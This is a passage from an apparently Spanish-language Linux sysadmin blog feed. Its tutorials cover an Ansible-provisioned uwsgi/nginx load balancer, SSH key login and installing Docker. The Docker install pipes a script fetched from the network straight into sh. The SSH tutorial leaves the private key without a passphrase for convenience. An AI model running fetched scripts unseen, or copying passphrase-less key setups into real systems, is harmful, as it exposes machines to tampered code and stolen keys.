&lt;span class="nv"&gt;chdir&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; /opt/
&lt;span class="nv"&gt;module&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; myapp:application
root@ansible:~# cat servers.yml 
- hosts: servers
  gather_facts: &lt;span class="nb"&gt;false&lt;/span&gt;
  tasks:
    - apt: &lt;span class="nv"&gt;name&lt;/span&gt;&lt;span class="o"&gt;={{&lt;/span&gt; item &lt;span class="o"&gt;}}&lt;/span&gt; &lt;span class="nv"&gt;state&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;installed
      with_items:
        - uwsgi-emperor
        - uwsgi-plugin-python
    - service: &lt;span class="nv"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;uwsgi-emperor &lt;span class="nv"&gt;state&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;started
    - copy: &lt;span class="nv"&gt;src&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;files/myapp.py &lt;span class="nv"&gt;dest&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/opt/myapp.py
    - copy: &lt;span class="nv"&gt;src&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;files/myapp.ini &lt;span class="nv"&gt;dest&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/etc/uwsgi-emperor/vassals/myapp.ini
    - file: &lt;span class="nv"&gt;path&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/etc/uwsgi-emperor/vassals/myapp.ini &lt;span class="nv"&gt;state&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;touch
root@ansible:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y con esta información, es todo tan fácil como lanzar el &lt;em&gt;playbook&lt;/em&gt; con el inventario creado.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@ansible:~# ansible-playbook -i hosts servers.yml 

PLAY ***************************************************************************

TASK &lt;span class="o"&gt;[&lt;/span&gt;apt&lt;span class="o"&gt;]&lt;/span&gt; *********************************************************************
changed: &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;172&lt;/span&gt;.17.0.4&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;item&lt;/span&gt;&lt;span class="o"&gt;=[&lt;/span&gt;u&lt;span class="s1"&gt;&amp;#39;uwsgi-emperor&amp;#39;&lt;/span&gt;, u&lt;span class="s1"&gt;&amp;#39;uwsgi-plugin-python&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;])&lt;/span&gt;
changed: &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;172&lt;/span&gt;.17.0.3&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;item&lt;/span&gt;&lt;span class="o"&gt;=[&lt;/span&gt;u&lt;span class="s1"&gt;&amp;#39;uwsgi-emperor&amp;#39;&lt;/span&gt;, u&lt;span class="s1"&gt;&amp;#39;uwsgi-plugin-python&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;])&lt;/span&gt;

TASK &lt;span class="o"&gt;[&lt;/span&gt;service&lt;span class="o"&gt;]&lt;/span&gt; *****************************************************************
changed: &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;172&lt;/span&gt;.17.0.3&lt;span class="o"&gt;]&lt;/span&gt;
changed: &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;172&lt;/span&gt;.17.0.4&lt;span class="o"&gt;]&lt;/span&gt;

TASK &lt;span class="o"&gt;[&lt;/span&gt;copy&lt;span class="o"&gt;]&lt;/span&gt; ********************************************************************
changed: &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;172&lt;/span&gt;.17.0.3&lt;span class="o"&gt;]&lt;/span&gt;
changed: &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;172&lt;/span&gt;.17.0.4&lt;span class="o"&gt;]&lt;/span&gt;

TASK &lt;span class="o"&gt;[&lt;/span&gt;copy&lt;span class="o"&gt;]&lt;/span&gt; ********************************************************************
changed: &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;172&lt;/span&gt;.17.0.3&lt;span class="o"&gt;]&lt;/span&gt;
changed: &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;172&lt;/span&gt;.17.0.4&lt;span class="o"&gt;]&lt;/span&gt;

TASK &lt;span class="o"&gt;[&lt;/span&gt;file&lt;span class="o"&gt;]&lt;/span&gt; ********************************************************************
changed: &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;172&lt;/span&gt;.17.0.3&lt;span class="o"&gt;]&lt;/span&gt;
changed: &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;172&lt;/span&gt;.17.0.4&lt;span class="o"&gt;]&lt;/span&gt;

PLAY RECAP *********************************************************************
&lt;span class="m"&gt;172&lt;/span&gt;.17.0.3                 : &lt;span class="nv"&gt;ok&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;5&lt;/span&gt;    &lt;span class="nv"&gt;changed&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;5&lt;/span&gt;    &lt;span class="nv"&gt;unreachable&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;    &lt;span class="nv"&gt;failed&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;   
&lt;span class="m"&gt;172&lt;/span&gt;.17.0.4                 : &lt;span class="nv"&gt;ok&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;5&lt;/span&gt;    &lt;span class="nv"&gt;changed&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;5&lt;/span&gt;    &lt;span class="nv"&gt;unreachable&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;    &lt;span class="nv"&gt;failed&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;   

root@ansible:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y ya podríamos hacer peticiones al puerto para obtener respuestas adecuadas.&lt;/p&gt;
&lt;h3&gt;El balanceador&lt;/h3&gt;
&lt;p&gt;Vamos a utilizar &lt;strong&gt;nginx&lt;/strong&gt; con una configuración propia de balanceador, que también necesitamos:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@ansible:~# cat files/balancer 
upstream servers &lt;span class="o"&gt;{&lt;/span&gt;
    server &lt;span class="m"&gt;172&lt;/span&gt;.17.0.3:8080&lt;span class="p"&gt;;&lt;/span&gt;
    server &lt;span class="m"&gt;172&lt;/span&gt;.17.0.4:8080&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;

server &lt;span class="o"&gt;{&lt;/span&gt;
    location / &lt;span class="o"&gt;{&lt;/span&gt;
        proxy_pass http://servers&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="o"&gt;}&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
root@ansible:~# cat balancer.yml 
- hosts: balancer
  gather_facts: &lt;span class="nb"&gt;false&lt;/span&gt;
  tasks:
    - apt: &lt;span class="nv"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;nginx-light &lt;span class="nv"&gt;state&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;installed
    - service: &lt;span class="nv"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;nginx &lt;span class="nv"&gt;state&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;started
    - file: &lt;span class="nv"&gt;path&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/etc/nginx/sites-enabled/default &lt;span class="nv"&gt;state&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;absent
    - copy: &lt;span class="nv"&gt;src&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;files/balancer &lt;span class="nv"&gt;dest&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/etc/nginx/sites-enabled/balancer
    - service: &lt;span class="nv"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;nginx &lt;span class="nv"&gt;state&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;reloaded
root@ansible:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y con esto tenemos lo suficiente para lanzar la provisión. Allá vamos!&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@ansible:~# ansible-playbook -i hosts balancer.yml 

PLAY ***************************************************************************

TASK &lt;span class="o"&gt;[&lt;/span&gt;apt&lt;span class="o"&gt;]&lt;/span&gt; *********************************************************************
changed: &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;172&lt;/span&gt;.17.0.2&lt;span class="o"&gt;]&lt;/span&gt;

TASK &lt;span class="o"&gt;[&lt;/span&gt;service&lt;span class="o"&gt;]&lt;/span&gt; *****************************************************************
changed: &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;172&lt;/span&gt;.17.0.2&lt;span class="o"&gt;]&lt;/span&gt;

TASK &lt;span class="o"&gt;[&lt;/span&gt;file&lt;span class="o"&gt;]&lt;/span&gt; ********************************************************************
changed: &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;172&lt;/span&gt;.17.0.2&lt;span class="o"&gt;]&lt;/span&gt;

TASK &lt;span class="o"&gt;[&lt;/span&gt;copy&lt;span class="o"&gt;]&lt;/span&gt; ********************************************************************
changed: &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;172&lt;/span&gt;.17.0.2&lt;span class="o"&gt;]&lt;/span&gt;

TASK &lt;span class="o"&gt;[&lt;/span&gt;service&lt;span class="o"&gt;]&lt;/span&gt; *****************************************************************
changed: &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;172&lt;/span&gt;.17.0.2&lt;span class="o"&gt;]&lt;/span&gt;

PLAY RECAP *********************************************************************
&lt;span class="m"&gt;172&lt;/span&gt;.17.0.2                 : &lt;span class="nv"&gt;ok&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;5&lt;/span&gt;    &lt;span class="nv"&gt;changed&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;5&lt;/span&gt;    &lt;span class="nv"&gt;unreachable&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;    &lt;span class="nv"&gt;failed&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;   

root@ansible:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Se puede verificar que funciona lanzando peticiones al puerto 80 de esta máquina.&lt;/p&gt;
&lt;h2&gt;Comprobación del resultado&lt;/h2&gt;
&lt;p&gt;La mala noticia es que la red 172.17.0.0/16 es privada, y no podemos acceder a ella a menos que sea desde un contenedor. La buena, es que tuvimos la previsión de publicar el puerto 80 del contenedor, mapeado en el puerto 8000 del &lt;em&gt;host&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Así pues, es como si el puerto 80 del balanceador fuera el puerto 8000 de nuestra máquina. Basta con hacer algunas peticiones para darse cuenta de que tenemos las máquinas perfectamente funcionales.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/build$ curl http://localhost:8000/
Hello from server1
gerard@sirius:~/build$ curl http://localhost:8000/
Hello from server2
gerard@sirius:~/build$ curl http://localhost:8000/
Hello from server1
gerard@sirius:~/build$ curl http://localhost:8000/
Hello from server2
gerard@sirius:~/build$ 
&lt;/pre&gt;&lt;/div&gt;</content><category term="linux"></category><category term="docker"></category><category term="dockerfile"></category><category term="ansible"></category><category term="playbook"></category></entry><entry><title>Autenticación SSH por claves</title><link href="http://www.linuxsysadmin.ml/2016/05/autenticacion-ssh-por-claves.html" rel="alternate"></link><published>2016-05-30T08:00:00+02:00</published><updated>2016-05-30T08:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2016-05-30:/2016/05/autenticacion-ssh-por-claves.html</id><summary type="html">&lt;p&gt;A pesar de que el protocolo &lt;strong&gt;SSH&lt;/strong&gt; es lo que mas seguridad ofrece hoy en día, un servidor rápido puede probar gran cantidad de contraseñas generadas mediante un generador por fuerza bruta. Para añadir mas seguridad podemos autenticar mediante claves en vez de usar contraseña, opcionalmente protegidos con una &lt;em&gt;passphrase …&lt;/em&gt;&lt;/p&gt;</summary><content type="html">&lt;p&gt;A pesar de que el protocolo &lt;strong&gt;SSH&lt;/strong&gt; es lo que mas seguridad ofrece hoy en día, un servidor rápido puede probar gran cantidad de contraseñas generadas mediante un generador por fuerza bruta. Para añadir mas seguridad podemos autenticar mediante claves en vez de usar contraseña, opcionalmente protegidos con una &lt;em&gt;passphrase&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;La idea es que un cliente del servidor &lt;strong&gt;SSH&lt;/strong&gt; se autentique reemplazando la contraseña habitual por una clave, previamente generada y con su parte pública compartida con anterioridad.&lt;/p&gt;
&lt;h2&gt;Disposición inicial&lt;/h2&gt;
&lt;p&gt;Para la demostración tenemos dos servidores, con los roles claramente especificados en el nombre:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@lxc:~# lxc-ls -f
NAME       STATE    IPV4      IPV6  AUTOSTART
---------------------------------------------
client     RUNNING  &lt;span class="m"&gt;10&lt;/span&gt;.0.0.3  -     NO
sshserver  RUNNING  &lt;span class="m"&gt;10&lt;/span&gt;.0.0.2  -     NO
root@lxc:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;En el caso del servidor, necesitamos un servidor &lt;strong&gt;SSH&lt;/strong&gt; levantado y listo para recibir nuevas sesiones.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@sshserver:~# netstat -lntp
Active Internet connections &lt;span class="o"&gt;(&lt;/span&gt;only servers&lt;span class="o"&gt;)&lt;/span&gt;
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        &lt;span class="m"&gt;0&lt;/span&gt;      &lt;span class="m"&gt;0&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;.0.0.0:22              &lt;span class="m"&gt;0&lt;/span&gt;.0.0.0:*               LISTEN      &lt;span class="m"&gt;76&lt;/span&gt;/sshd
tcp6       &lt;span class="m"&gt;0&lt;/span&gt;      &lt;span class="m"&gt;0&lt;/span&gt; :::22                   :::*                    LISTEN      &lt;span class="m"&gt;76&lt;/span&gt;/sshd
root@sshserver:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Vamos a crear un usuario con el que podamos entrar en el servidor.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@sshserver:~# grep gerard /etc/passwd
gerard:x:1000:1000:,,,:/home/gerard:/bin/bash
root@sshserver:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Si intentamos entrar en el servidor desde la máquina cliente, vemos que se nos pide la contraseña, tras lo cual iniciamos la sesión.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@client:~# ssh gerard@10.0.0.2
gerard@10.0.0.2&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;s password:

The programs included with the Debian GNU/Linux system are free software&lt;span class="p"&gt;;&lt;/span&gt;
the exact distribution terms &lt;span class="k"&gt;for&lt;/span&gt; each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
gerard@sshserver:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;De hecho, si lo volvemos a intentar, se nos pedirá la &lt;em&gt;password&lt;/em&gt; una y otra vez.&lt;/p&gt;
&lt;h2&gt;Montando el par de claves&lt;/h2&gt;
&lt;p&gt;Desde la máquina cliente, generamos el par de claves mediante el comando &lt;strong&gt;ssh-keygen&lt;/strong&gt;. Sin parámetros va a generar un clave tipo &lt;strong&gt;RSA&lt;/strong&gt;, que ya nos vale.&lt;/p&gt;
&lt;p&gt;Es importante indicar que la &lt;em&gt;passphrase&lt;/em&gt; es más segura que la &lt;em&gt;password&lt;/em&gt;, y que la necesidad de la clave convierte el combo en lo mas seguro de lo que disponemos. Vamos a dejarla en blanco para asegurar la autenticación con claves sin &lt;em&gt;passphrase&lt;/em&gt;, por comodidad nuestra.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@client:~# ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key &lt;span class="o"&gt;(&lt;/span&gt;/root/.ssh/id_rsa&lt;span class="o"&gt;)&lt;/span&gt;:
Enter passphrase &lt;span class="o"&gt;(&lt;/span&gt;empty &lt;span class="k"&gt;for&lt;/span&gt; no passphrase&lt;span class="o"&gt;)&lt;/span&gt;:
Enter same passphrase again:
Your identification has been saved in /root/.ssh/id_rsa.
Your public key has been saved in /root/.ssh/id_rsa.pub.
The key fingerprint is:
&lt;span class="m"&gt;58&lt;/span&gt;:6b:38:71:82:a4:b2:97:4d:cc:6d:cd:43:6d:26:00 root@client
The key&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;s randomart image is:
+---&lt;span class="o"&gt;[&lt;/span&gt;RSA &lt;span class="m"&gt;2048&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;----+
&lt;span class="p"&gt;|&lt;/span&gt;    E.....       &lt;span class="p"&gt;|&lt;/span&gt;
&lt;span class="p"&gt;|&lt;/span&gt;   &lt;span class="o"&gt;=&lt;/span&gt; o +. +      &lt;span class="p"&gt;|&lt;/span&gt;
&lt;span class="p"&gt;|&lt;/span&gt;. . &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; *+       &lt;span class="p"&gt;|&lt;/span&gt;
&lt;span class="p"&gt;|&lt;/span&gt; o + . B o       &lt;span class="p"&gt;|&lt;/span&gt;
&lt;span class="p"&gt;|&lt;/span&gt;. o . + S        &lt;span class="p"&gt;|&lt;/span&gt;
&lt;span class="p"&gt;|&lt;/span&gt; .     o         &lt;span class="p"&gt;|&lt;/span&gt;
&lt;span class="p"&gt;|&lt;/span&gt;                 &lt;span class="p"&gt;|&lt;/span&gt;
&lt;span class="p"&gt;|&lt;/span&gt;                 &lt;span class="p"&gt;|&lt;/span&gt;
&lt;span class="p"&gt;|&lt;/span&gt;                 &lt;span class="p"&gt;|&lt;/span&gt;
+-----------------+
root@client:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Esto nos ha generado el par de claves en la carpeta que nos preguntó el comando de generación. En este caso dejamos los valores por defecto.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@client:~# ls -1 .ssh/
id_rsa
id_rsa.pub
known_hosts
root@client:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Vemos que tenemos dos ficheros nuevos. El fichero &lt;em&gt;id_rsa&lt;/em&gt; es la clave privada, y es una parte que nunca debe compartirse. El fichero &lt;em&gt;id_rsa.pub&lt;/em&gt; es la parte pública de la clave y es la que debemos repartir a los servidores a los que pretendamos tener acceso con la clave.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@client:~# cat .ssh/id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDHR7HSGhP8afT1pz/no+qVT1uKsEhh4CZXIbDebibbKiyPYVaKl/FLovYnCwk0IWXAsiJB1eXkQhX0he0gSK66UIZFnKVr8+G1J1kg9zuqxFTxpJTrM2WbdTZ+nk3bNgKTFKiQNsZ/IMvb/vjgU365LNtDclnajto0scgSCZQBvDfxrNVH8NIyv4IBTKheD6oSNgQsmzpvbWRyKBZf3dRRdVH00tsIC20fdAONtNfcWNToakRMX0/svW7RxUDlJEU/icsm3lf6xRf927CdB0ziu90i9mpzCxTMP3xbsrOJ0/mtdqROjql+OHNvxJa8FOtvX/ZdkNRAPOvuo4AieLZp root@client
root@client:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Para garantizar el acceso a nuestro servidor, debemos poner una nueva línea en el fichero &lt;em&gt;authorized_keys&lt;/em&gt; del usuario remoto, que es la parte pública de la clave. Es especialmente importante que la carpeta &lt;em&gt;.ssh&lt;/em&gt; exista y no tenga permisos para nada ni nadie aparte del usuario propietario.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sshserver:~$ mkdir .ssh
gerard@sshserver:~$ chmod &lt;span class="m"&gt;700&lt;/span&gt; .ssh/
gerard@sshserver:~$ cat .ssh/authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDHR7HSGhP8afT1pz/no+qVT1uKsEhh4CZXIbDebibbKiyPYVaKl/FLovYnCwk0IWXAsiJB1eXkQhX0he0gSK66UIZFnKVr8+G1J1kg9zuqxFTxpJTrM2WbdTZ+nk3bNgKTFKiQNsZ/IMvb/vjgU365LNtDclnajto0scgSCZQBvDfxrNVH8NIyv4IBTKheD6oSNgQsmzpvbWRyKBZf3dRRdVH00tsIC20fdAONtNfcWNToakRMX0/svW7RxUDlJEU/icsm3lf6xRf927CdB0ziu90i9mpzCxTMP3xbsrOJ0/mtdqROjql+OHNvxJa8FOtvX/ZdkNRAPOvuo4AieLZp root@client
gerard@sshserver:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Pueden haber varias claves públicas en el fichero &lt;em&gt;authorized_keys&lt;/em&gt;, para garantizar la autenticación desde diferentes lugares sin compartir las claves entre los servidores de  origen.&lt;/p&gt;
&lt;h2&gt;Comprobando su funcionamiento&lt;/h2&gt;
&lt;p&gt;Para ver que todo funciona, basta con intentar entrar en la sesión; si todo va bien, no nos va a pedir &lt;em&gt;password&lt;/em&gt; sino &lt;em&gt;passphrase&lt;/em&gt;, suponiendo que no la dejáramos en blanco.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@client:~# ssh gerard@10.0.0.2

The programs included with the Debian GNU/Linux system are free software&lt;span class="p"&gt;;&lt;/span&gt;
the exact distribution terms &lt;span class="k"&gt;for&lt;/span&gt; each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu May &lt;span class="m"&gt;19&lt;/span&gt; &lt;span class="m"&gt;10&lt;/span&gt;:11:51 &lt;span class="m"&gt;2016&lt;/span&gt; from &lt;span class="m"&gt;10&lt;/span&gt;.0.0.3
gerard@sshserver:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;De hecho, si ponemos el &lt;em&gt;flag&lt;/em&gt; de &lt;em&gt;verbose&lt;/em&gt;, vemos que el servidor origen &lt;strong&gt;ofrece&lt;/strong&gt; automáticamente la clave generada. Si la clave no estuviera en los sitios normales, habría que indicarlo en el comando &lt;strong&gt;ssh&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@client:~# ssh -v gerard@10.0.0.2
...
debug1: Connecting to &lt;span class="m"&gt;10&lt;/span&gt;.0.0.2 &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;10&lt;/span&gt;.0.0.2&lt;span class="o"&gt;]&lt;/span&gt; port &lt;span class="m"&gt;22&lt;/span&gt;.
debug1: Connection established.
...
debug1: Authentications that can &lt;span class="k"&gt;continue&lt;/span&gt;: publickey,password
debug1: Next authentication method: publickey
debug1: Offering RSA public key: /root/.ssh/id_rsa
...
debug1: Authentication succeeded &lt;span class="o"&gt;(&lt;/span&gt;publickey&lt;span class="o"&gt;)&lt;/span&gt;.
...
gerard@sshserver:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Es importante recalcar que la parte privada que se ofrece es la que hay en la carpeta del usuario del servidor origen, pero la validación se hace con el fichero &lt;em&gt;authorized_keys&lt;/em&gt; del usuario en el servidor remoto.&lt;/p&gt;</content><category term="linux"></category><category term="ssh"></category><category term="autenticación"></category><category term="password"></category><category term="passphrase"></category><category term="rsa"></category></entry><entry><title>Evolucionando los contenedores: Docker</title><link href="http://www.linuxsysadmin.ml/2016/05/evolucionando-los-contenedores-docker.html" rel="alternate"></link><published>2016-05-23T08:00:00+02:00</published><updated>2016-05-23T08:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2016-05-23:/2016/05/evolucionando-los-contenedores-docker.html</id><summary type="html">&lt;p&gt;Los contenedores tienen su caso de uso y son muy útiles. Sin embargo, ir copiando la imagen es una pérdida de tiempo. Aunque podemos solventar el problema con un sistema de ficheros &lt;em&gt;copy-on-write&lt;/em&gt; o un sistema de ficheros tipo &lt;em&gt;union&lt;/em&gt;, &lt;strong&gt;Docker&lt;/strong&gt; ya nos lo ofrece todo preparado para su uso …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Los contenedores tienen su caso de uso y son muy útiles. Sin embargo, ir copiando la imagen es una pérdida de tiempo. Aunque podemos solventar el problema con un sistema de ficheros &lt;em&gt;copy-on-write&lt;/em&gt; o un sistema de ficheros tipo &lt;em&gt;union&lt;/em&gt;, &lt;strong&gt;Docker&lt;/strong&gt; ya nos lo ofrece todo preparado para su uso.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Docker&lt;/strong&gt; trabaja con imágenes, que no son otra cosa que jaulas en donde tienen todo lo que necesitan para ejecutar su contenido. Estas imágenes se forman a partir de capas que se muestran como una sola mediante &lt;strong&gt;aufs&lt;/strong&gt;. Esto nos permite construir jaulas a partir de otras, ahorrando duplicidad de ficheros en disco y aligerando sus instancias.&lt;/p&gt;
&lt;p&gt;Nuestro contenedor no es otra cosa que una capa de cambios (inicialmente vacía) montada encima de la imagen mediante &lt;strong&gt;aufs&lt;/strong&gt;. Esta capa se elimina cuando el contenedor se destruye. El coste de crear el contenedor es prácticamente nulo, y no se modifica nunca la imagen base.&lt;/p&gt;
&lt;p&gt;La gran diferencia con otras tecnologías, por ejemplo &lt;strong&gt;LXC&lt;/strong&gt;, es su filosofía: un contenedor &lt;strong&gt;Docker&lt;/strong&gt; ejecuta un solo comando, acabando la ejecución cuando este acaba.&lt;/p&gt;
&lt;h2&gt;Instalación y verificación&lt;/h2&gt;
&lt;p&gt;La instalación es tan simple como seguir &lt;a href="https://docs.docker.com/linux/step_one/"&gt;la documentación&lt;/a&gt;. Así lo instalé en mi &lt;em&gt;netbook&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~$ curl -fsSL https://get.docker.com/ &lt;span class="p"&gt;|&lt;/span&gt; sh
...
gerard@sirius:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Comprobamos su funcionamiento, por ejemplo, levantando una imagen cualquiera.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~$ docker run -ti --rm debian &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Hello world&amp;#39;&lt;/span&gt;
Unable to find image &lt;span class="s1"&gt;&amp;#39;debian:latest&amp;#39;&lt;/span&gt; locally
latest: Pulling from library/debian
8b87079b7a06: Pull &lt;span class="nb"&gt;complete&lt;/span&gt; 
a3ed95caeb02: Pull &lt;span class="nb"&gt;complete&lt;/span&gt; 
Digest: sha256:c8bdce9b6166fcd287c1336f5cd6262971f7f0e98db07c93c23d540a7a19cd96
Status: Downloaded newer image &lt;span class="k"&gt;for&lt;/span&gt; debian:latest
Hello world
gerard@sirius:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Podemos ver en la salida del comando que no teníamos una imagen local de la imagen &lt;em&gt;debian&lt;/em&gt;, con lo que la ha descargado. Podemos ver que ya la tenemos en local, y que si volvemos a lanzar el comando, no se descarga de nuevo.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~$ docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
debian              latest              bb5d89f9b6cb        &lt;span class="m"&gt;4&lt;/span&gt; days ago          &lt;span class="m"&gt;125&lt;/span&gt;.1 MB
gerard@sirius:~$ docker run -ti --rm debian &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Hello world&amp;#39;&lt;/span&gt;
Hello world
gerard@sirius:~$ 
&lt;/pre&gt;&lt;/div&gt;


